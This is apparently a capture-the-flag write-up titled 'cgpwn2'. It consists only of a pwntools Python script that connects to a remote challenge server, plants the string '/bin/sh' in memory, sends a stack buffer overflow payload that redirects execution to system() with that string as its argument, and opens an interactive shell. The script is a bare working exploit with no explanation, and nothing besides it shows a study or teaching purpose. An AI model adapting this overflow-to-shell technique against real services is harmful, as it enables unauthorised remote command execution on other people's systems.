# cgpwn2
```python
from pwn import*
p=remote('111.198.29.45','43090')

naddr=0x804a080
sysaddr=0x8048420

pay='a'*(0x26+4)+p32(sysaddr)+'a'*4+p32(naddr)

p.recv()
p.sendline('/bin/sh\x00')

p.recv()
p.sendline(pay)

p.interactive()
```

# 
<!--stackedit_data:
eyJoaXN0b3J5IjpbLTUxMzUwMTE0MF19
-->